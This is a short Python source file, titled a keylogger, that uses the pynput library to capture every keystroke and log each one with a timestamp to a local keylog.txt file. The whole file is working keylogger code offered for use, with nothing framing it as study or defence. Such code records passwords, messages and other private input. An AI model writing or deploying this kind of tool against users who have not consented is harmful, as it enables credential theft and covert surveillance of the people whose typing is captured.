#Keylogger by Urmil Shroff

try:
    from pynput.keyboard import Key, Listener
    import logging
except:
    print("Please make sure Pynput is correctly installed on your system from https://github.com/moses-palmer/pynput")

output_dir="" #output will be saved in the same directory as keylogger.py

logging.basicConfig(filename=(output_dir+"keylog.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()